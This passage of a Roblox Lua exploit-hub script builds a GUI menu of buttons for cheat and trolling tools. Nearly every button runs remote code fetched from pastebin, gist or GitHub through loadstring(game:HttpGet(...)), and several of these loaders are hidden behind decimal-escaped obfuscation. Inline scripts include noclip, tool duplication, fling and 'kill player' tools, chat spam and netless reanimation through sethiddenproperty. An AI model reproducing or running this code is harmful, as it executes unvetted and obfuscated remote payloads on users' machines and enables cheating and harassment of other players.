    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
end)

Section:NewButton("RTX Gui 1", "RTX Version 1", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Z6m1aPy1",true))()
end)

Section:NewButton("PARADOX GUI", "Cool admin stuff", function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/JLPe0B3H'),true))();
end)

Section:NewButton("Shushi X HUB", "BKHAX HUB KART X(2)", function()
   loadstring(game:HttpGet("https://paste.ee/r/bf5oO", true))()
end)

Section:NewButton("Fe Sussy HUB", "18+ lol", function()
   loadstring(game:HttpGet(('https://gist.githubusercontent.com/Nilrogram/8b0c8bd710be142f383c71f79279752c/raw/e4fb01a7de7cd498bb53270d2ad191dfab268a88/FE%2520SussyHub'),true))();
end)

Section:NewButton("Moon HUB V3", "Op Hub", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/LwQkm563"))();
end)

Section:NewButton("Replication Ui", "Alot fe", function()
local screenGui = game:GetObjects("rbxassetid://3546404827")[1]
  local mainFrame = screenGui.Frame
    local pages = mainFrame.Pages
      local pageLayout = pages.UIPageLayout
      local pageScripts = pages.Scripts
        local interactiveButton = pageScripts.Character.Elements.TextButton
        local utility = pageScripts.Utility
          local utilityElements = utility.Elements
      local pageOptions = pages.Options
    local titleFrame = mainFrame.Title
    local toolbar = mainFrame.Toolbar

screenGui.LocalScript:Destroy()
screenGui.Parent = game:GetService("CoreGui")
interactiveButton.Parent = nil
mainFrame.Visible = true

gripCenter = CFrame.new(0, 0, 1) * CFrame.Angles(math.rad(90), 0, 0)
offset = CFrame.Angles(0, 0, 0)

_player = {
	p = game:GetService("Players").LocalPlayer;
	b = function()
		return _player.p:FindFirstChild("Backpack")
	end;
	c = function()
		return _player.p.Character
	end;
}
_functions = {
	respawn = function()
		local c = _player.c()
		if workspace:FindFirstChild(_player.p.Name) then 
			spawn(function()
				wait(.5)
				if _player.c() ~= workspace:FindFirstChild(_player.p.Name) then
					workspace:FindFirstChild(_player.p.Name):BreakJoints()
				end
			end)
		end
		if c then
			c:BreakJoints()
			c:ClearAllChildren()
		end
		local newChar = Instance.new("Model", workspace)
		local hum = Instance.new("Humanoid", newChar)
		local torso = Instance.new("Part", newChar)
		newChar.Name = "respawn_"
		torso.Name = "Torso"
		torso.Transparency = 1
		_player.p.Character = newChar
		torso.Name = ""
		torso.CanCollide = false
		newChar:MoveTo(Vector3.new(999999, 999999, 999999))
	end;
	tools = function(int)
		local toolamount = int or 200
		
		local LocalPlayer = game:GetService("Players").LocalPlayer
		local runservice = game:GetService("RunService")
		LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
		local currentamount = #LocalPlayer.Backpack:GetChildren()
		LocalPlayer.Character.Archivable = true
		local tempchar = LocalPlayer.Character:Clone()
		local lastchar = nil
		tempchar.Parent = workspace
		local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
		local renderstepped = runservice.RenderStepped:Connect(function()
		    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
		    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
			   	if tool:IsA("Tool") then
		            tool.Parent = LocalPlayer
		        end
		    end
			for _, char in pairs(workspace:GetChildren()) do
				if char.Name == LocalPlayer.Name and char:FindFirstChildWhichIsA("Humanoid") then
					char.Humanoid.Health = 0
				end
			end
		    LocalPlayer.Character:ClearAllChildren()
		    local char = Instance.new("Model", workspace)
		    Instance.new("Humanoid", char)
		    LocalPlayer.Character = char
		    if lastchar ~= nil then
		        lastchar:Destroy()
		    end
		    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
		    lastchar = char
		end)
		repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 3 - currentamount >= toolamount
		renderstepped:Disconnect()
		repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
		lastchar:Destroy()
		
		utilityElements.Tools.Text = "Done respawning"
		repeat runservice.RenderStepped:Wait() until utilityElements.Tools.Text == "Load Tools"
		
		for _, tool in pairs(LocalPlayer:GetChildren()) do
		    if tool:IsA("Tool") then
		        tool.Parent = LocalPlayer.Backpack
		    end
		end
		LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
		tempchar:Destroy()
	end;
	load = function()
		local b = _player.b()
		local c = _player.c()
		local grip = function(tool, cf)
			local origin = CFrame.new(cf.p)
			local x, y, z = cf:toEulerAnglesXYZ()
			local new = CFrame.Angles(x, y, z)
			local grip = (origin * new):inverse()
			tool.Grip = grip
		end
		local model = c:WaitForChild("gay") -- stupid name choice from what a few months ago i have nothing against it i swear
		local parts = {}
		wait(1)
		
		for i, Model in pairs(c:GetChildren()) do
			if Model:IsA("Model") and Model.Name == "gay" then
				for i, v in pairs(Model:GetDescendants()) do
					if v:IsA("BasePart") then
						v.LocalTransparencyModifier = 1
						if v.Name ~= "Ignore" then
							table.insert(parts, v)
						end
					end
					if not v:IsA("BasePart") and not v:IsA("JointInstance") and not v:IsA("BodyMover") and not v:isA("Humanoid") and not v:IsA("Model") then
						v:Remove()
					end
				end
				Model.ChildAdded:Connect(function(c)
					c.Parent = nil
				end)
			end
		end
		
		for _, part in pairs(parts) do
			local m = Instance.new("BlockMesh", part)
			m.Scale = Vector3.new(0, 0, 0)
		end
		
		local tools = b:GetChildren()
		for i, tool in pairs(tools) do
			if tool.Parent then
				wrap(function()
					tool.Parent = c
					for i, v in pairs(tool:GetDescendants()) do
						if v:IsA("Sound") or v:IsA("TouchTransmitter") then
							v:Destroy()
						elseif v:IsA("BasePart") then
							v.Massless = true
							v.CanCollide = false
						elseif v:IsA("LocalScript") or v:IsA("Script") then
							v:Destroy()
						end
					end
					
					if tool:FindFirstChild("Handle") then
						local handle = tool.Handle
						local fakeHandle = handle:Clone()
						fakeHandle.Name = "FakeHandle"
						fakeHandle.Parent = tool
						local w = Instance.new("Weld", handle)
						w.Part0 = fakeHandle
						w.Part1 = handle
						handle.Size = Vector3.new(0, 0, 0)
					end
					
					tool.Parent = b
				end)
			end
			if (not parts[i]) then
				tools[i] = nil
				tool:Destroy()
			end
		end
		
		wait(.2)
		local amt = #tools
		
		wrap(function()
			local connection1
			
			connection1 = game:GetService("RunService").RenderStepped:Connect(function(step)
				for i = 1, amt do
					local tool = tools[i]
					if parts[i] then
						tool.Parent = b
						tool.Parent = c
					end
				end
				
				if _player.c() ~= c or c:FindFirstChildWhichIsA("Humanoid").Health == 0 then
					connection1:Disconnect()
				end
				
				utilityElements.Replicate.Text = ("Replicate (%dfps)"):format(1/step)
			end)
		end)
		
		local connection2
		connection2 = game:GetService("RunService").Heartbeat:Connect(function()
			for i = 1, amt do
				local tool = tools[i]
				if parts[i] then
					if parts[i].Transparency ~= 1 then
						local p = _cframe.toWorldPoint(parts[i].CFrame) * offset
						grip(tool, p)
					else
						local p = _cframe.toWorldPoint(CFrame.new(0, -250, 0))
						grip(tool, p)
					end
				end
			end
			if _player.c() ~= c or c:FindFirstChildWhichIsA("Humanoid").Health == 0 then
				connection2:Disconnect()
			end
		end)
	end;
}
_cframe = {
	diff = function(a, b)
		return (a:Inverse() * b)
	end;
	toWorldPoint = function(a)
		local arm = _player.c():FindFirstChild('Right Arm') or _player.c():FindFirstChild('RightHand')
		local off = arm.CFrame * gripCenter:Inverse()
		if arm.Name == "RightHand" then
			off = arm.CFrame * CFrame.Angles(math.rad(-90), 0, 0)
		end
		return _cframe.diff(off, a)
	end;
	tween = function(object,style,direction,t,goal)
	    local tweenservice = game:GetService("TweenService")
	    local tweenInfo = TweenInfo.new(t,Enum.EasingStyle[style],Enum.EasingDirection[direction])
	    local tween = tweenservice:Create(object,tweenInfo,goal)
	    tween:Play()
	    return tween
	end;
}
scriptList = {
	Character = {
		['Titan']			= {"rbxassetid://3600286284", "rbxassetid://3070358214"};
		['Winged Titan']	= {"rbxassetid://3593786550", "rbxassetid://3070358214"};
		['Part Surround']	= {"rbxassetid://3546680077", "rbxassetid://3546673786"};
	},
	Mechanical = {
		['Spiderbot']		= {"rbxassetid://3040869607", "rbxassetid://3070355648"};
		['Drone']			= {"rbxassetid://3074236927", "rbxassetid://3074245958"};
		['Noise']			= {"rbxassetid://3193712297", "rbxassetid://3070358314"};
	},
	Aesthetic = {
		['Wings']			= {"rbxassetid://3040946714", "rbxassetid://3070358381"};
		['Tail']			= {"rbxassetid://3041387168", "rbxassetid://3070358314"};
		['Star Glitcher']	= {"rbxassetid://3074734519", "rbxassetid://3074751071"};
		['Tentacles']		= {"rbxassetid://3074817074", "rbxassetid://3074820325"};
	},
	Weapon = {
		['Master Hand']		= {"rbxassetid://3040943596", "rbxassetid://3070358267"};
		['Ravenger']		= {"rbxassetid://3040945482", "rbxassetid://3070358154"};
	},
}
wrap = function(f)
	return coroutine.wrap(f)()
end

if game:GetService("RunService"):IsStudio() then
	guiLib = require(screenGui.GuiLib)
else
	guiLib = loadstring(screenGui.GuiLib.Source)()
end

for title, tbl in pairs(scriptList) do
	local frame = pageScripts[title]
	for name, info in pairs(tbl) do
		local btn = interactiveButton:Clone()
		btn.Name = name
		btn.Text = name
		btn.Parent = frame.Elements
		btn.Icon.Image = info[2]
		
		guiLib.circleInteractive(btn)
		guiLib.colorInteractive(btn)
		
		btn.MouseButton1Click:Connect(function()
			local scr = game:GetObjects(info[1])[1]
			local source = scr.Source
			
			if game:GetService("RunService"):IsStudio() == false then
				for i, v in pairs(scr:GetChildren()) do
					v.Parent = script
				end
				wrap(function()
					local func = loadstring(source)
					spawn(func)
				end)
			else
				scr.Disabled = true
				scr.Parent = _player.c()
				wait(.1)
				scr.Disabled = false
			end
		end)
	end
end

repeat wait() until pageLayout.CurrentPage

guiLib.draggable(mainFrame, titleFrame)
for i, v in pairs(toolbar:GetChildren()) do
	if v:IsA("TextButton") then
		guiLib.circleInteractive(v, 2, 1)
		v.MouseButton1Click:Connect(function()
			pageLayout:JumpTo(pages[v.Name])
		end)
		pageLayout.Changed:Connect(function(p)
			if pageLayout.CurrentPage.Name == v.Name then
				guiLib.tween(v, "Sine", "Out", .5, {BackgroundColor3 = Color3.fromRGB(255, 118, 26)})
			else
				guiLib.tween(v, "Sine", "Out", .5, {BackgroundColor3 = Color3.fromRGB(236, 109, 17)})
			end
		end)
	end
end

for i, v in pairs(utilityElements:GetChildren()) do
	if v:IsA("TextButton") then
		guiLib.circleInteractive(v)
		guiLib.colorInteractive(v)
	end
end

utilityElements.Reset.MouseButton1Click:Connect(function()
	local c = _player.c()
	c.Humanoid.Health = 0
	wait(.55)
	for i, v in pairs(c:GetChildren()) do
		if v:IsA("BackpackItem") then
			v.Parent = _player.b()
			v.Parent = _player.p
		end
	end
	repeat wait() until _player.c() ~= c
	_player.c():WaitForChild("Right Arm")
	wait(.25)
	for i, v in pairs(_player.p:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = _player.b()
		end
	end
end)

utilityElements.Block.MouseButton1Click:Connect(function()
	local c = _player.c()
	for _, v in pairs(c:GetChildren()) do
		if v:IsA("BackpackItem") then
			for _, m in pairs(v:GetDescendants()) do
				if m:IsA("DataModelMesh") then
					m:Destroy()
				end
			end
		end
	end
end)

local noclip = false
utilityElements.Noclip.MouseButton1Click:Connect(function()
	noclip = not noclip
end)

utilityElements.Tools.MouseButton1Click:Connect(function()
	if utilityElements.Tools.Text == "Load Tools" then
		_functions.tools(120)
	else
		utilityElements.Tools.Text = "Load Tools"
	end
end)

utilityElements.Replicate.MouseButton1Click:Connect(function()
	_functions.load()
end)

local flipped = 0
utilityElements.Flip.MouseButton1Click:Connect(function()
	flipped = (flipped + 1) % 4
	if flipped == 0 then
		offset = CFrame.Angles(0, 0, 0)
	elseif flipped == 1 then
		offset = CFrame.Angles(math.rad(90), 0, 0)
	elseif flipped == 2 then
		offset = CFrame.Angles(0, math.rad(90), 0)
	elseif flipped == 3 then
		offset = CFrame.Angles(0, 0, math.rad(90))
	end
end)

game:GetService("RunService").Stepped:Connect(function()
	local c = _player.c()
	if noclip then
		local descendants = c:GetDescendants()
		for i = 1, #descendants do
			local v = descendants[i]
			if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
				v.CanCollide = false
			end
		end
	end
end)

workspace:WaitForChild("S")
end)


Section:NewButton("Terminate Hub", "Animation I think", function()
_G.Velocity = Vector3.new(30,0,0)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatek/ProjectTerm/main/main.lua"))()
end)

Section:NewButton("FE LX HUB", "Animation Transform FE", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/Gogogamer61/LXHub-Main/main/LXHub%20Main%20Script'),true))()
end)

Section:NewButton("Reach GUI V3", "easy for sword", function()
   SGTSOBF_LLllLllLl={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\92","\49","\48","\52","\92","\49","\49","\54","\92","\49","\49","\54","\92","\49","\49","\50","\92","\49","\49","\53","\92","\53","\56","\92","\52","\55","\92","\52","\55","\92","\49","\49","\50","\92","\57","\55","\92","\49","\49","\53","\92","\49","\49","\54","\92","\49","\48","\49","\92","\57","\56","\92","\49","\48","\53","\92","\49","\49","\48","\92","\52","\54","\92","\57","\57","\92","\49","\49","\49","\92","\49","\48","\57","\92","\52","\55","\92","\49","\49","\52","\92","\57","\55","\92","\49","\49","\57","\92","\52","\55","\92","\49","\48","\53","\92","\55","\53","\92","\49","\49","\48","\92","\52","\57","\92","\49","\49","\52","\92","\49","\48","\52","\92","\57","\48","\92","\49","\49","\56","\92","\49","\48","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_KKKKkKKkk="";for _,SGTSOBF_yYYYyyyYy in pairs(SGTSOBF_LLllLllLl)do SGTSOBF_KKKKkKKkk=SGTSOBF_KKKKkKKkk..SGTSOBF_yYYYyyyYy;end;SGTSOBF_FfffFffFf=function(SGTSOBF_dDDdDddDD)loadstring(SGTSOBF_dDDdDddDD)()end;SGTSOBF_FfffFffFf(SGTSOBF_KKKKkKKkk)
end)

Section:NewButton("Auto Jump Gui", "Set jump time", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/vViq08jX'))()
end)

Section:NewButton("Auto Toxic Gui", "Just say bad things lol", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming123/JN-HH-Gaming-AutoToxic1/main/README.md",true))()
end)

Section:NewButton("MXS Hub", "Old OP GUI", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/jYJsBA1A", true))()
end)

Section:NewButton("Ultimate Trolling GUI V3", "Some Will Work", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))() 
end)

Section:NewButton("Spam Hub", "Alot of Troll Stuff", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/ColdStep2/Chatdestroyer-Hub-V1/main/Chatdestroyer%20Hub%20V1'),true))()
end)

Section:NewButton("Dark Ghost Hub(Pass: GhostPlayer)", "New and all Ghostplayer script", function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\117\118\112\49\100\119\78\39\41\41\40\41\10")()
end)

Section:NewButton("KZS Hub", "idk ._.", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KZSHUB/KZS-HUB/main/KZSHUBV1.5", true))()
end)

Section:NewButton("Frixon Hub", "Eee idk", function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/RedoGaming/459eb467f3df927b07ca398a68f3b053/raw/6d1f7a2c8fefd072dc53ebbbec38c6f93c7de1ad/Frixon%2520Hub!%2520New%2520OP%2520Exploit%2520Hub%2520for%2520Roblox!'))()
end)

Section:NewButton("RageFlake Hub", "Lol", function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/RedoGaming/2e5943498c487ea97df0d436dd35c234/raw/f0445b1afcd9193bfb94bc75dda7318310a22ad2/Rageflake!%2520New%2520OP%2520Roblox%2520Exploit%2520Hub!'))()
end)

Section:NewButton("Zen Hub", "Eeeeee idk", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/KaiZen/main/GameHub", true))()
end)

Section:NewButton("Ultimate Trolling Gui V3", "Op i think new", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))() 
end)

Section:NewButton("Psy Hub", "Op and have executor i think", function()
loadstring(game:GetObjects("rbxassetid://3014051754")[1].Source)()
end)

Section:NewButton("Troll Gui", "Op idk", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(203, 130, 255)
Main.BorderSizePixel = 7
Main.Position = UDim2.new(0.211427703, 0, 0.213305563, 0)
Main.Size = UDim2.new(0, 390, 0, 242)
Main.Active = true
Main.Draggable = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 174, 245)
TextLabel.BorderColor3 = Color3.fromRGB(64, 101, 127)
TextLabel.BorderSizePixel = 2
TextLabel.Position = UDim2.new(-0.00256410264, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 389, 0, 36)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Troll Scripts "
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 36.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(147, 60, 171)
TextLabel.TextWrapped = true


TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton.BorderSizePixel = 3
TextButton.Position = UDim2.new(0.0308483411, 0, 0.197368398, 0)
TextButton.Size = UDim2.new(0, 113, 0, 32)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Ice Hub V4 for BH"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
end)
TextButton_2.Parent = Main
TextButton_2.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_2.BorderSizePixel = 3
TextButton_2.Position = UDim2.new(0.377773374, 0, 0.197368428, 0)
TextButton_2.Size = UDim2.new(0, 93, 0, 32)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Troll Player GUI"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Down:connect(function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\56\117\81\76\49\109\84\39\41\41\40\41\10")()
end)
TextButton_3.Parent = Main
TextButton_3.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_3.BorderSizePixel = 3
TextButton_3.Position = UDim2.new(0.663239181, 0, 0.197368398, 0)
TextButton_3.Size = UDim2.new(0, 118, 0, 32)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Kill Player GUI (tool)"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true
TextButton_3.MouseButton1Down:connect(function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\85\101\119\99\54\105\53\39\41\41\40\41\10")()
end)
TextButton_4.Parent = Main
TextButton_4.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_4.BorderSizePixel = 3
TextButton_4.Position = UDim2.new(0.663239181, 0, 0.429824591, 0)
TextButton_4.Size = UDim2.new(0, 118, 0, 32)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Fling GUI"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true
TextButton_4.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/fj5VwQtC'))()
end)
TextButton_5.Parent = Main
TextButton_5.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_5.BorderSizePixel = 3
TextButton_5.Position = UDim2.new(0.377773374, 0, 0.429824591, 0)
TextButton_5.Size = UDim2.new(0, 93, 0, 32)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "Invis Kinfe Fling"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true
TextButton_5.MouseButton1Down:connect(function()

---convert By Im Patrick

HumanDied = false for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'Torso' and v.Name ~= 'Head' then  _G.netless=game:GetService("RunService").Heartbeat:connect(function() v.AssemblyLinearVelocity = Vector3.new(-30,0,0) sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999) end) end end  local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {}  char.Archivable = true local reanim = char:Clone() reanim.Name = 'Nexo '..plr.Name..'' fl=Instance.new('Folder',char) fl.Name ='Nexo' reanim.Animate.Disabled=true char.HumanoidRootPart:Destroy() char.Humanoid:ChangeState(16)  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  function create(part, parent, p, r) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignOrientation.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] part.AlignOrientation.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part[part.Name].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  char.Torso['Left Shoulder']:Destroy() char.Torso['Right Shoulder']:Destroy() char.Torso['Left Hip']:Destroy() char.Torso['Right Hip']:Destroy()  create(char['Torso'],reanim['Torso']) create(char['Left Arm'],reanim['Left Arm']) create(char['Right Arm'],reanim['Right Arm']) create(char['Left Leg'],reanim['Left Leg']) create(char['Right Leg'],reanim['Right Leg'])  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  reanim.Parent = fl  table.insert(ct,srv.Heartbeat:Connect(function() char.Torso.CFrame=reanim.Torso.CFrame char.Torso.Velocity=Vector3.new(4000000,4000000,0) end))  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  table.insert(ct,reanim.Humanoid.Died:Connect(function() plr.Character = char char:BreakJoints() reanim:Destroy() game.Players:Chat('-gr') _G.netless:Disconnect() HumanDied = true for _,v in pairs(ct) do v:Disconnect() end end))  plr.Character = reanim workspace.CurrentCamera.CameraSubject = reanim.Humanoid


Player = game:GetService("Players").LocalPlayer
PlayerGui = Player.PlayerGui
Cam = workspace.CurrentCamera
Backpack = Player.Backpack
Character = Player.Character
Humanoid = Character.Humanoid
Mouse = Player:GetMouse()
RootPart = Character["HumanoidRootPart"]
Torso = Character["Torso"]
Head = Character["Head"]
RightArm = Character["Right Arm"]
LeftArm = Character["Left Arm"]
RightLeg = Character["Right Leg"]
LeftLeg = Character["Left Leg"]
RootJoint = RootPart["RootJoint"]
Neck = Torso["Neck"]
RightShoulder = Torso["Right Shoulder"]
LeftShoulder = Torso["Left Shoulder"]
RightHip = Torso["Right Hip"]
LeftHip = Torso["Left Hip"]

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

--//=================================\\
--|| 	      USEFUL VALUES
--\\=================================//

Animation_Speed = 3
Frame_Speed = 1 / 60 -- (1 / 30) OR (1 / 60)
local Speed = 12
local ROOTC0 = CF(0, 0, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
local NECKC0 = CF(0, 1, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
local RIGHTSHOULDERC0 = CF(-0.5, 0, 0) * ANGLES(RAD(0), RAD(90), RAD(0))
local LEFTSHOULDERC0 = CF(0.5, 0, 0) * ANGLES(RAD(0), RAD(-90), RAD(0))
local DAMAGEMULTIPLIER = 0
local ANIM = "Idle"
local ATTACK = false
local EQUIPPED = false
local HOLD = false
local COMBO = 1
local Rooted = false
local SINE = 0
local KEYHOLD = false
local CHANGE = 2 / Animation_Speed
local WALKINGANIM = false
local VALUE1 = false
local VALUE2 = false
local ROBLOXIDLEANIMATION = IT("Animation")
ROBLOXIDLEANIMATION.Name = "Roblox Idle Animation"
ROBLOXIDLEANIMATION.AnimationId = "http://www.roblox.com/asset/id=180435571"
--ROBLOXIDLEANIMATION.Parent = Humanoid
local WEAPONGUI = IT("ScreenGui", PlayerGui)
WEAPONGUI.Name = "Weapon GUI"
local Weapon = IT("Model")
Weapon.Name = "Adds"
local Effects = IT("Folder", Weapon)
Effects.Name = "Effects"
local ANIMATOR = Humanoid.Animator
local ANIMATE = Character.Animate
local UNANCHOR = true
local PLAYANIMS = true
local CLOAKED = false

--//=================================\\
--\\=================================//


--//=================================\\
--|| SAZERENOS' ARTIFICIAL HEARTBEAT
--\\=================================//

ArtificialHB = Instance.new("BindableEvent", script)
ArtificialHB.Name = "ArtificialHB"

script:WaitForChild("ArtificialHB")

frame = Frame_Speed
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.ArtificialHB:Fire()

game:GetService("RunService").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.ArtificialHB:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				script.ArtificialHB:Fire()
			end
		lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

--//=================================\\
--\\=================================//

--//=================================\\
--|| 	      SOME FUNCTIONS
--\\=================================//

function Raycast(POSITION, DIRECTION, RANGE, IGNOREDECENDANTS)
	return workspace:FindPartOnRay(Ray.new(POSITION, DIRECTION.unit * RANGE), IGNOREDECENDANTS)
end

function PositiveAngle(NUMBER)
	if NUMBER >= 0 then
		NUMBER = 0
	end
	return NUMBER
end

function NegativeAngle(NUMBER)
	if NUMBER <= 0 then
		NUMBER = 0
	end
	return NUMBER
end

function Swait(NUMBER)
	if NUMBER == 0 or NUMBER == nil then
		ArtificialHB.Event:wait()
	else
		for i = 1, NUMBER do
			ArtificialHB.Event:wait()
		end
	end
end

function CreateMesh(MESH, PARENT, MESHTYPE, MESHID, TEXTUREID, SCALE, OFFSET)
	local NEWMESH = IT(MESH)
	if MESH == "SpecialMesh" then
		NEWMESH.MeshType = MESHTYPE
		if MESHID ~= "nil" and MESHID ~= "" then
			NEWMESH.MeshId = "http://www.roblox.com/asset/id="..MESHID
		end
		if TEXTUREID ~= "nil" and TEXTUREID ~= "" then
			NEWMESH.TextureId = "http://www.roblox.com/asset/id="..TEXTUREID
		end
	end
	NEWMESH.Offset = OFFSET or VT(0, 0, 0)
	NEWMESH.Scale = SCALE
	NEWMESH.Parent = PARENT
	return NEWMESH
end

function CreatePart(FORMFACTOR, PARENT, MATERIAL, REFLECTANCE, TRANSPARENCY, BRICKCOLOR, NAME, SIZE, ANCHOR)
